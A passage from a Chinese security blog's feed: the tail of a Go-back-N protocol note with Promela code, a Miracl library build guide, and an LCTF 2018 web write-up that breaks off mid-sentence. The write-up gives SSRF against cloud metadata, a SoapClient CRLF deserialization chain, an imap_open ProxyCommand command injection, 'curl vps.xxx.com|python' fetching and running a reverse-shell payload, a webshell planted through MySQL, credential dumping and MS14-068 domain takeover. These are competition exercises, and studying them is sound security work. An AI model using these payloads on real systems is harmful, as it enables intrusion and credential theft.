id="1-基本原理-1"><a href="#1-基本原理-1" class="headerlink" title="1.基本原理"></a><strong>1.基本原理</strong></h3><p><strong>网络:</strong> Go-back-N策略的基本原理：当接收方检测出时序的信息后，要求发送方重发最后一个正确接受的信息帧之后的所有未被确认的帧；或者当发送方发送了n个帧后，若发现该n帧的前一帧在计时器超时区间内仍未返回其确认信息，则该帧被判定为出错或丢失，此时发送方不得不重新发送该出错帧及其后的n帧。</p><p>**你：**说人话！</p><p><strong>我：</strong> 好好好，实际上这个协议可以认为是上面我说的那个停止等待协议的一个演进版本，停止等待协议是因为我们接收方的接受速度不一定能赶上传输方的传输速度，或者是会出现一些丢包和错误的问题的解决办法，我们设置了一个确认包，要求只有在接收方发出来确认包的时候发送方才能继续发送下一帧数据，但是你有没有发现这样做效率很低，发送方那个急啊……要一直等着。</p><p>**那么有没有什么方法能提高一点发送放的效率呢？**这就是 GO-BACK-N 的目的，我们要让发送方在接收方没啥反应的时候接着工作，那么我们就需要一个存储多个数据帧的空间，我们形象地称之为 “窗口” ，那么我假设窗口的大小为4 </p><p>（1）如果接收方没有任何反应，发送方会已知发送四个数据，到这个窗口填满为止<br>（2）如果接收方在发送方传输完第二个数据以后给了第一个数据的ACK回应，那么第一个数据就从这个窗口中移除，第二个数据移动到第一个数据的为止，现在窗口中就只有第二个数据<br>（3）如果接收方给出的回应是错误回应，表示发送中出现错误，那么整个窗口中的数据都会被清空，所有的数据重新发送</p><h3 id="2-实例代码："><a href="#2-实例代码：" class="headerlink" title="2.实例代码："></a><strong>2.实例代码：</strong></h3><pre><code class="hljs">#define WIN 4 /*定义窗口大小*/#define MAX 25/*定义发送报文计数最大值*/chan s_r=[10] of &#123;mtype,byte,byte&#125;;/*定义发送端到接收端传输通道*/chan r_s=[10] of &#123;mtype,byte,byte&#125;;/*定义接收端到发送端传输通道*/mtype=&#123;mesg, ack, err&#125;;/*定义消息类型*/proctype udt_sender() /*发送端进程*/&#123;byte s,r,swl;/*s 为要发送的报文的序号,r 为确认报文的序号,swl 为滑动窗口下限*/swl = 0; /*窗口初始化*/do::swl = swl;progress:s = swl; /*将要发送报文指针移到窗口头*/progress1: if::s_r!mesg(0,s)-&gt; /*成功发送正确报文*/(swl&lt;=s)-&gt;s = (s+1)%MAX;/*s 后移*/if::goto progress1; /*在窗口内连续发送*/::skip/*也可以不发送*/fi;::s_r!err(s,0) -&gt; /*发送的报文在传输通道中出错*/(swl&lt;=s)-&gt;s = (s+1)%MAX;if::goto progress1;::skipfi;::skip -&gt; /*报文在传输通道中丢失*/(swl&lt;=s)-&gt;s = (s+1)%MAX;if::goto progress1;::skipfi;fi;if::timeout -&gt; goto progress /*超时,从超时报文开始重发*/::r_s?err(0,r) -&gt; skip /*收到错误报文不工作*/::r_s?ack(r,0) -&gt;/*收到正确应答报文*/if::(r&lt;swl)-&gt;skip /*确认序号低于窗口下限*/::(r&gt;s) -&gt; skip /*高于已发送报文最大值*/::(swl&lt;=r&lt;=s) -&gt; /*正确确认*/swl = r;/*移动窗口*/goto progress; /*继续发送*/fi;fi;od&#125;proctype udt_receiver()/*接收端进程*/&#123;byte t,es;/*t 为接收报文的序号,es 为期望收到的报文序号*/es = 0; /*初始化*/do::s_r?mesg(0,t) -&gt;/*收到正确报文*/if::(t==es)-&gt; /*收到报文为所期望报文*/progress2:es = (es + 1)%MAX;/*更新期望值*/if::r_s!ack(es,0) /*发送确认*/::r_s!err(0,es) /*发送的确认报文在传输通道中出错*/::skip /*确认报文在传输通道中丢失*/fi::(t!=es)-&gt;/*收到无效报文*/if::r_s!ack(es,0)/*重发确认*/::r_s!err(0,es) /*发送的确认报文在传输通道中出错*/::skip /*确认报文在传输通道中丢失*/fifi::s_r?err(t,0)-&gt;/*收到的报文出错*/if::r_s!ack(es,0)/*重发确认*/::r_s!err(0,es) /*发送的确认报文在传输通道中出错*/::skip /*确认报文在传输通道中丢失*/fiod&#125;init&#123; /*启动进程*/run udt_sender();run udt_receiver();&#125; </code></pre><h3 id="3-运行结果"><a href="#3-运行结果" class="headerlink" title="3.运行结果"></a><strong>3.运行结果</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/go-back-n.png" alt="此处输入图片的描述"></p><p>其实从这个效果图中我们也能非常清楚地看到接收方连续地接受了发送方的四个数据</p><h2 id="0X05-总结"><a href="#0X05-总结" class="headerlink" title="0X05 总结"></a><strong>0X05 总结</strong></h2><p>配合promela 语言 spin 这个工具还是非常好的模拟了协议的抽象运行过程。这门语言由于和一般的编程语言没什么关联还是要好好学一下才行，<a href="http://spinroot.com/spin/Man/promela.html">官网在这里</a>.</p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记 协议分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 下编译并使用 Miracl 库</title>
    <link href="/2018/12/09/Ubuntu%20%E4%B8%8B%E7%BC%96%E8%AF%91%E5%B9%B6%E4%BD%BF%E7%94%A8%20Miracl%20%E5%BA%93/"/>
    <url>/2018/12/09/Ubuntu%20%E4%B8%8B%E7%BC%96%E8%AF%91%E5%B9%B6%E4%BD%BF%E7%94%A8%20Miracl%20%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0X01-Miracl-是什么"><a href="#0X01-Miracl-是什么" class="headerlink" title="0X01  Miracl 是什么"></a><strong>0X01  Miracl 是什么</strong></h2><p>MIRACL(Multiprecision Integer and Rational Arithmetic C&#x2F;c++ Library)是一套由Shamus Software Ltd.所开发的一套关于大数运算函数库，用来设计与大数运算相关的密码学之应用，包含了RSA 公开密码学、Diffie-Hellman密钥交换(Key Exchange)、AES、DSA数字签名，还包含较新的椭圆曲线密码学(Elliptic Curve Cryptography)等等。运算速度快，并提供源代码。国外著名密码学函数库还有：GMP、NTL、Crypto++、LibTomCrypt(LibTomMath)、OpenSSL等。</p><span id="more"></span><blockquote><p>(1)这是我找到的一些关于这个库的文档：</p><p>链接：<a href="https://pan.baidu.com/s/1WDXIeI3ajAclHQB42Kzbxg">https://pan.baidu.com/s/1WDXIeI3ajAclHQB42Kzbxg</a>  提取码：5sjp </p><p>(2)这是这个库的 github 项目</p><p><a href="https://github.com/miracl/MIRACL">https://github.com/miracl/MIRACL</a></p></blockquote><h2 id="0X02-编译"><a href="#0X02-编译" class="headerlink" title="0X02 编译"></a><strong>0X02 编译</strong></h2><p>由于 ubuntu 在编译方面相对于 centos 方便一些，于是我这里以 ubuntu 进行说明</p><h3 id="1-下载并解压-GitHub-的-Miracl-zip"><a href="#1-下载并解压-GitHub-的-Miracl-zip" class="headerlink" title="1.下载并解压 GitHub 的 Miracl zip"></a><strong>1.下载并解压 GitHub 的 Miracl zip</strong></h3><p>下载下 MIRACL-master.zip 文件以后，我们需要新建一个 miracl 文件夹</p><pre><code class="hljs">mkdir miracl</code></pre><p>将 zip 文件拷贝到 miracl 中以后，使用下面的命令进行解压</p><pre><code class="hljs">unzip -j -aa -L MIRACL*.zip</code></pre><h3 id="2-开始编译"><a href="#2-开始编译" class="headerlink" title="2.开始编译"></a><strong>2.开始编译</strong></h3><p>在 miracl 目录下运行 linux64 这个脚本</p><pre><code class="hljs">bash linux64</code></pre><p>等待一会就编译结束了,执行下面这条命令测试一下是否编译成功，如果正常运行就是编译成功了</p><p>.&#x2F;pk-demo </p><h3 id="3-将-h-拷贝"><a href="#3-将-h-拷贝" class="headerlink" title="*3.将 .h 拷贝"></a>*<em>3.将 <em>.h 拷贝</em></em></h3><p>Linux 要想引用头文件我们需要将我们的自己的库的 .h 文件都放到 linux 的 &#x2F;usr&#x2F;include 中，为了区分各种的库，我在 &#x2F;usr&#x2F;include 创建一个 miracl 文件夹</p><pre><code class="hljs">cp ./miracl/*.h /usr/include/miracl</code></pre><h3 id="4-将-miracl-a-文件移动并重命名"><a href="#4-将-miracl-a-文件移动并重命名" class="headerlink" title="4.将 miracl.a 文件移动并重命名"></a><strong>4.将 miracl.a 文件移动并重命名</strong></h3><p>我们需要在链接的时候用到这个库，我们就要把这个静态链接库文件放在 &#x2F;usr&#x2F;lib 下，并命名为 libxxxx.a</p><pre><code class="hljs">cp ./miracl/miracl.a /usr/lib/libmiracl.a</code></pre><h3 id="5-修改头文件"><a href="#5-修改头文件" class="headerlink" title="5.修改头文件"></a><strong>5.修改头文件</strong></h3><p>因为我刚刚在 include 目录下创建了一个 miracl 文件夹，于是我们引用头文件的时候也要带上</p><pre><code class="hljs">#include&lt;miracl/miracl.h&gt;#include&lt;miracl/mirdef.h&gt;</code></pre><h3 id="6-使用-gcc-编译-c-文件"><a href="#6-使用-gcc-编译-c-文件" class="headerlink" title="6.使用 gcc 编译 c 文件"></a><strong>6.使用 gcc 编译 c 文件</strong></h3><pre><code class="hljs">gcc sm3.c -o sm3 -lmiracl</code></pre><h2 id="0X03-补充"><a href="#0X03-补充" class="headerlink" title="0X03 补充"></a><strong>0X03 补充</strong></h2><p>如果有人对这个 gcc 编译，包括 静态动态链接不是很清楚的话，可以看一下这本书的 3.3.1 节，我觉得写得非常好，也是别人推荐给我的</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/1PWLxrT8VtmD5MKSCU-3WhQ">https://pan.baidu.com/s/1PWLxrT8VtmD5MKSCU-3WhQ</a>  提取码：bq6v</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gcc 备忘 笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LCTF 2018 部分 web 题详细 writeup</title>
    <link href="/2018/11/21/LCTF%202018%20%E9%83%A8%E5%88%86%20web%20%E9%A2%98%20writeup/"/>
    <url>/2018/11/21/LCTF%202018%20%E9%83%A8%E5%88%86%20web%20%E9%A2%98%20writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>LCTF 2018 还是一如既往的来了，虽然也是出题人，但是并不代表能做出来其他师傅的题，我也是一边运维一边做题，一边听师傅们的思路，简单的看了几道题，下面是简单的记录</p><h2 id="0X01-Travel"><a href="#0X01-Travel" class="headerlink" title="0X01 Travel"></a><strong>0X01 Travel</strong></h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel1.png" alt="此处输入图片的描述"></p><span id="more"></span><p><strong>还给了代码：</strong></p><pre><code class="hljs"># -*- coding: utf-8 -*-from flask import request, render_templatefrom config import create_appimport osimport urllibimport requestsimport uuidapp = create_app()@app.route(&#39;/upload/&lt;filename&gt;&#39;, methods = [&#39;PUT&#39;])            # 幂等的请求，会产生覆盖def upload_file(filename):    name = request.cookies.get(&#39;name&#39;)    pwd = request.cookies.get(&#39;pwd&#39;)    if name != &#39;lctf&#39; or pwd != str(uuid.getnode()):           # 不知道硬件地址则绕不过去        return &quot;0&quot;    filename = urllib.unquote(filename)                         # 进行 url 解码    with open(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename), &#39;w&#39;) as f:        f.write(request.get_data(as_text = True))        return &quot;1&quot;    return &quot;0&quot;@app.route(&#39;/&#39;, methods = [&#39;GET&#39;])def index():    url = request.args.get(&#39;url&#39;, &#39;&#39;)    if url == &#39;&#39;:        return render_template(&#39;index.html&#39;)    if &quot;http&quot; != url[: 4]:                                     # 必须要 http 请求        return &quot;hacker&quot;    try:        response = requests.get(url, timeout = 10)        response.encoding = &#39;utf-8&#39;        return response.text    except:        return &quot;Something Error&quot;@app.route(&#39;/source&#39;, methods = [&#39;GET&#39;])def get_source():    return open(__file__).read()if __name__ == &#39;__main__&#39;:    app.run()</code></pre><p>了解过 SSRF 的同学看一眼就知道是 SSRF ，但是我们的目标是什么呢？我们看到有一个文件写的点，但是我们并不知道 uuid.getnode() ，在HCTF 我们已经领略过这个函数的作用，我们知道他是主机的 mac 地址的十进制表示，于是我们希望利用SSRF 实现本地文件读取，但是这里明显有几个限制，首先限制了 协议是 http 和 https ，这就排除了我们使用 file 等协议，当然可能有人说可以使用 302 跳转，没错，requests.get() 在没有设置，allow_redirects&#x3D;False 的情况下是会进行跟随的，但是如果你尝试使用 file 等其他协议他就会报错，这应该是 requests 的保护机制吧。</p><p>那么这种情况下其实还是要看看开放的端口，毕竟是 flask ，万一有什么 redis 啥的未授权呢？可以直接写 shell 啥的，我使用 nmap 测试了一下发现只有80 和 22 ，没戏了，想别的办法吧。</p><p>后来给了提示说是什么 “留意云服务商和差异性”，云服务商是啥，我们看一下</p><pre><code class="hljs">$ curl cip.cc/118.25.150.86IP      : 118.25.150.86地址    : 中国  上海运营商  : tencent.com数据二  : 上海市 | 腾讯云数据三  : 中国上海上海市 | 电信URL     : http://www.cip.cc/118.25.150.86</code></pre><p>腾讯云，那我们看一下腾讯云的<a href="https://cloud.tencent.com/document/product/213/4934">实例文档</a>，找到了下面的东西</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel2.png" alt="此处输入图片的描述"></p><p>不得了！我们试一下获取 mac ,直接输 <a href="http://metadata.tencentyun.com/latest/meta-data/mac">http://metadata.tencentyun.com/latest/meta-data/mac</a></p><pre><code class="hljs">52:54:00:48:c8:73</code></pre><p>我们从而得到十进制：90520735500403</p><p>这样我们就能写文件了，但是我又发现了一个问题，这个写文件要求是 PUT 请求，然后我怎么 PUT 都 405 ，后来才知道 nginx 的 405 和 flask 的 405 不是一个 405，还是那么菜。</p><p>下图是 get 请求的到的 405 </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel3.png" alt="此处输入图片的描述"></p><p>下图是 PUT 请求得到的405 </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel4.png" alt="此处输入图片的描述"></p><p>我们看到使用 PUT 方法的 405 是 nginx 给我们的，也就是这个是经过反向代理得到的，我们的 PUT 请求被反向代理服务器拦截了，我们这样也就明确了目标，我们如何在 flask 中突破 nginx 反向代理的限制，同时出题人也给了一个提示 header ，这样我们就去找一下 flask 中什么请求头有这样的作用</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel5.png" alt="此处输入图片的描述"></p><p>我们来试一下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel6.png" alt="此处输入图片的描述"></p><p>可以看到我们能返回1 ，那我们是不是就能任意文件写了呢？</p><p>用户名在代码中已经存在 lctf ，那我们可以写一个公钥 &#x2F;home&#x2F;lctf&#x2F;.ssh&#x2F;authorized_keys，地址这里还有一个小坑，必须要使用 URL 二次编码 </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel7.png" alt="此处输入图片的描述"></p><p>这时候已经成功写入，我们登录</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Travel8.png" alt="此处输入图片的描述"></p><h2 id="0X02-bestphp’s-revenge"><a href="#0X02-bestphp’s-revenge" class="headerlink" title="0X02 bestphp’s revenge"></a><strong>0X02 bestphp’s revenge</strong></h2><p><strong>代码审计：</strong></p><pre><code class="hljs">&lt;?phphighlight_file(__FILE__);$b = &#39;implode&#39;;call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[&#39;name&#39;]))&#123;    $_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;);call_user_func($b,$a);?&gt;array(0) &#123; &#125; </code></pre><p>还有一个 flag.php </p><pre><code class="hljs">&lt;?phpsession_start();echo &#39;only localhost can get flag!&#39;;$flag = &#39;LCTF&#123;*************************&#125;&#39;;if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;       $_SESSION[&#39;flag&#39;] = $flag;   &#125;//only localhost can get flag!</code></pre><p>一开始看 index.php ,可以说是一脸蒙蔽了，但是后来看了 flag.php 以后目标就很清晰了，我们需要伪造我们的 remote_addr 为 Localhost 然后访问 flag.php 拿到 flag ，但我们知道 remote_addr 哪里能伪造，想要让 remote_addr 是 127.0.0.1 那只有一种方法就是实现 ssrf ，后来给了一个 hint ：反序列化，也就是我们要使用反序列化触发 ssrf 访问 flag.php 页面，并且访问的时候我们还要带上我们自己的 cookie 访问，要不然我们没法写到我们自己的 session 中，这样我们也就没法访问到 flag 了</p><p>但是问题来了，我之前在分析 php 反序列化的时候也说了，PHP 反序列化就是要控制一个类的属性，然后在调用过程中最终传入某个恶意函数中达到命令执行或者代码执行的效果，但是很明显这里啥都没有，这其实也给了我们一个提示，我们要用 php 的原生类，其实这个知识点在 N1CTF 2018 中已经出现过了，使用 soapclient 原生类，在不使用 wsdl 的情况下创建的对象在调用不存在的方法的时候会触发 __call 方法，然后能发起请求</p><p>我们看一下我的测试</p><p><strong>test.php</strong></p><pre><code class="hljs">&lt;?php$a = new SoapClient(null, array(            &#39;location&#39;=&gt; &quot;http://h4ck3r.club:9999&quot;,             &#39;uri&#39;=&gt; &quot;test&quot;)); $a-&gt;getsubtime();</code></pre><p><strong>结果如图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best1.png" alt="此处输入图片的描述"></p><p>成功的发起了请求，这其实就是我们实现 SSRF，然后如何携带 Cookie 呢？ 这里用到了 soapclient 的一个 uri 和 user_agent的 CRLF 注入，我们</p><p><strong>test.php</strong></p><pre><code class="hljs">&lt;?php$a = new SoapClient(null, array(            &#39;location&#39;=&gt; &quot;http://h4ck3r.club:9999&quot;,             &#39;user_agent&#39; =&gt; &quot;AAA:BBB\r\n&quot;.&quot;Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912&quot;,            &#39;uri&#39;=&gt; &quot;test&quot;)); $res = serialize($a);$a = unserialize($res);$a-&gt;getsubtime();</code></pre><p><strong>结果：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best5.png" alt="此处输入图片的描述"></p><p>当然怎么反序列化这其实还是一个问题,但是观察代码，我们很明显能看到一个存在序列化的地方</p><pre><code class="hljs">&lt;?php//...session_start();if(isset($_GET[&#39;name&#39;]))&#123;  $_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];&#125;//...</code></pre><p>我们知道，session 是经过序列化进行存储的，我们可以试试，传入 name&#x3D;K0rz3n 上面代码执行的结果是</p><pre><code class="hljs">name|s:6:&quot;K0rz3n&quot;;</code></pre><p>等等，这个序列化为什么长得有些奇怪，感觉和我们对象使用 serialize 序列化出来的结果长得很不一样，没错，这个其实就是我们的利用点了，php 在 sesion 序列化的时候有三种序列化引擎，php 、php_serialize 和 php_binary,其中 php 这种序列化的方式是默认的方式。</p><blockquote><p>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值<br>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值<br>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</p></blockquote><p>也就是说， php 这种序列化的方式是不序列化键名的，而是单纯地序列化键值，而对键值的序列化使用的是我们在序列化对象的时候使用的 serialize() 函数的方式，那我们有这样的一种想法，如果我们把我们的 soapclient 对象序列化后在前面，加一个 | 然后存入 session ，并且指定 session 序列化的方法为 php_serialize</p><pre><code class="hljs">a:1:&#123;s:4:&quot;name&quot;;s:115:&quot;|O:10:&quot;SoapClient&quot;:3:&#123;s:3:&quot;uri&quot;;s:4:&quot;test&quot;;s:8:&quot;location&quot;;s:23:&quot;http://h4ck3r.club:9999&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;&quot;;&#125;</code></pre><p>这一步的实现可以通过题目中的 </p><pre><code class="hljs">call_user_func($_GET[f],$_POST);</code></pre><p>来实现，当然这个要借助 session_start() 函数的一个选项</p><pre><code class="hljs">bool session_start ([ array $options = array() ] )options此参数是一个关联数组，如果提供，那么会用其中的项目覆盖 会话配置指示 中的配置项。此数组中的键无需包含 session. 前缀。</code></pre><p>那么会话配置指示里面是什么呢？</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best2.png" alt="此处输入图片的描述"></p><p>那么在 session 反序列化的时候使用默认的 php 引擎的话就会错误地将这个 | 当做控制字符来分隔键值和键名（这其实就是注入漏洞的本质），然后对我们 | 后面的部分再次使用 unserialize() 反序列化，那我们的对象就能重现江湖了</p><p>等等，为什么能触发反序列化呢？？？？</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best3.png" alt="此处输入图片的描述"></p><p>也就是说这个步骤是 php 在处理会话的过程中帮我们自动完成的,不信我们测试一下，目前的状态是我们已经将我们的 soapclient 对象按照 php_serialize 的方式序列化进了 session 文件，然后我们要按照 php 引擎的方式解析，下面是测试代码</p><p><strong>test.php</strong></p><pre><code class="hljs">&lt;?phpsession_start();$a = array(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;);var_dump($a);</code></pre><p><strong>结果：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best4.png" alt="此处输入图片的描述"></p><p>很明显我们的注入成功了，他按照我们注入的 | 进行了分隔，反序列化了我们传入的 soapclient</p><p>好，现在反序列化和 SSRF 我们已经捋清楚了，我们还差一点东西，根据 soapclient 的要求，我么想要发起请求必须要让反序列化出来的对象调用一个不存在的方法，怎么弄？</p><p>于是我又注意到了这个代码下面还有一个 call_user_func() 这不得不说是一个非常明显的疑点，按道理这里就应该是我们的利用点了，因为我们的  <code>$a[0]</code> 就是我们的 soapcliet 对象了，虽然 <code>$b</code> 是一个确定的值，但是我们还是能使用 第一个 call_user_func 调用  extract 来实现变量覆盖</p><p>我们看一下下面的操作吧</p><p><strong>test1.php</strong></p><pre><code class="hljs">&lt;?phpclass test&#123;function __call($name,$args)&#123;echo &quot;Hello~&quot;;&#125;&#125;$a = new test();call_user_func(array($a,&#39;hhh&#39;));?&gt;</code></pre><p><strong>结果：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_best6.png" alt="此处输入图片的描述"></p><p>我们在 call_user_func 中传入了一个 array() 并且第一个值为一个类的对象，另一个是这个类中不存在的方法，然后他出发了调用，好了，这里的思路我们彻底清晰了</p><p>我们要使用 extract 覆盖变量 b 为 call_user_func 然后，”welcome_to_the_lctf2018” 这个字符串就是我们的不存在的方法。最终可以实现 __call 的调用，实现发出带着我们设定好 cookie 的请求，然后 flag 被写入我们的 session 中，我们最后再带着这个 cookie 列出 session 中的内容就可以了</p><h2 id="0X03-God-of-domain-pentest"><a href="#0X03-God-of-domain-pentest" class="headerlink" title="0X03 God of domain-pentest"></a><strong>0X03 God of domain-pentest</strong></h2><pre><code class="hljs">&lt;?phphighlight_file(__FILE__);$lshell=$_GET[&#39;lshell&#39;];eval($lshell);var_dump($lshell);NULL </code></pre><p>先使用 phpinfo(); 看一下 disable function ，因为出题人在旁边，他说过滤了全部，不要我继续绕 disable 了，</p><p><strong>如图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest1.png" alt="此处输入图片的描述"></p><p>最近不是出了一个新的操作？用来 bypass disable_fuction 的 imap </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest2.png" alt="此处输入图片的描述"></p><p>不多说，打！一开始使用 bash 反弹没成功，问了一下他们，他们说 Python 反弹效果更好欧，于是开始 python 反弹，结果还是不行，后来把 Payload 放在了服务器上，然后用 curl 请求 并且使用 | 交给 python 执行（向师傅们学来的操作），</p><pre><code class="hljs">curl vps.xxx.com|python</code></pre><p>然后，我们将其 base64 以后放在 payload 框架里</p><pre><code class="hljs">$server = &quot;x -oProxyCommand=echo\txxxxxxxxxxxxxxxxxxxxxx|base64\t-d|sh&#125;&quot;;imap_open(&#39;&#123;&#39;.$server.&#39;:143/imap&#125;INBOX&#39;, &#39;&#39;, &#39;&#39;) or die(&quot;\n\nError: &quot;.imap_last_error());</code></pre><p>然后为了防止 url 传输过去的问题，还是使用 url 编码</p><pre><code class="hljs">%24server%20%3D%20%22x%20-oProxyCommand%3Decho%5Ctxxxxxxxxxxxxxxxxxxxxxx%7Cbase64%5Ct-d%7Csh%7D%22%3Bimap_open(&#39;%7B&#39;.%24server.&#39;%3A143%2Fimap%7DINBOX&#39;%2C%20&#39;&#39;%2C%20&#39;&#39;)%20or%20die(%22%5Cn%5CnError%3A%20%22.imap_last_error())%3B</code></pre><p>然后执行就行了，成功反弹</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest3.png" alt="此处输入图片的描述"></p><p>看一下 ip </p><pre><code class="hljs">eth0      Link encap:Ethernet  HWaddr 52:54:00:2a:75:a6            inet addr:172.21.0.17  Bcast:172.21.15.255  Mask:255.255.240.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:897233 errors:0 dropped:0 overruns:0 frame:0          TX packets:783700 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:264883816 (264.8 MB)  TX bytes:240894961 (240.8 MB)lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          UP LOOPBACK RUNNING  MTU:65536  Metric:1          RX packets:1824 errors:0 dropped:0 overruns:0 frame:0          TX packets:1824 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1           RX bytes:177022 (177.0 KB)  TX bytes:177022 (177.0 KB)</code></pre><p>内网 ip 已经明确了，然后在 &#x2F;var&#x2F;www 目录下面看到了出题人好心的 ew</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest4.png" alt="此处输入图片的描述"></p><p>我们试一下挂一个内网的代理，我有时候选择全局有时候指定应用，这个其实根据你使用的工具来决定</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest5.png" alt="此处输入图片的描述"></p><p>然后我直接使用 netstat -ano 看了一下这台服务器建立的链接发现，他和 172.21.0.8 成功建立连接，这就直接找到了一台服务器</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest7.png" alt="此处输入图片的描述"></p><p>浏览器成功访问</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest6.png" alt="此处输入图片的描述"></p><p>进行一波目录扫描</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest8.png" alt="此处输入图片的描述"></p><p>PHPmyadmin 提权？ 我们进去看看</p><p>root root 登录，这还得了，观察一下我们也能发现这个就是一个简单的 phpstudy 起的，我们 MySQL 提权那么多方法，不了解的可以看我的<a href="http://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/">这篇文章</a></p><p>我首先尝试了使用 select into outfile 的方法，但是收到了 secure_file_priv 的限制，后来我选择了使用 general_log 的方法，我们先看一下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest9.png" alt="此处输入图片的描述"></p><p>这样不仅能看到选项是否开启，也能看到默认的安装路径了，那这样web 目录也就非常清晰</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest10.png" alt="此处输入图片的描述"></p><p>现在我们拿到了 webshell 然后我们需要反弹 windows 的 shell ，使用 cs </p><pre><code class="hljs">./teamserver xxx.xxx.xxx.xxx K0rz3n</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest11.png" alt="此处输入图片的描述"></p><p>用 cs 生成 powershell payload 执行</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest12.png" alt="此处输入图片的描述"></p><p>然后抓密码，先进入 cs 的命令行</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest13.png" alt="此处输入图片的描述"></p><p>输入 help 查看常见的帮助，我们注意一下那个 shell 命令，表示我们在后面执行 cmd.exe  的命令</p><pre><code class="hljs">shell whoami </code></pre><p>就能看到我是 administrator 权限，然后我们开始抓密码，使用</p><pre><code class="hljs">logonpasswords</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest14.png" alt="此处输入图片的描述"></p><p>然后既然题目提示中提到了域环境，那我们就要先简单的判断一下，我们自己所处的环境</p><pre><code class="hljs">shell ipconfig/all</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest15.png" alt="此处输入图片的描述"></p><p>根据我之间的一域渗透的简单文章，很容易知道 DNS 就是域控</p><p>我们现在需要攻击域控，使用 ms14068 拿域控的权限，使用 impacket 库中的 goldenPac.py，我们直接使用 Python 在入口机器上执行，在入口机器上的 &#x2F;tmp 目录下使用 wget 下载</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest16.png" alt="此处输入图片的描述"></p><p>我们运行脚本 getshell</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest17_.png" alt="此处输入图片的描述"></p><p>好了现在拿到了子域的域控权限，是一个 windows  的 shell , 我们找一下父域域控，如图所示</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest18.png" alt="此处输入图片的描述"></p><p>先把这台机器弹回 cs 中</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_Pentest19.png" alt="此处输入图片的描述"></p><p>到 windows 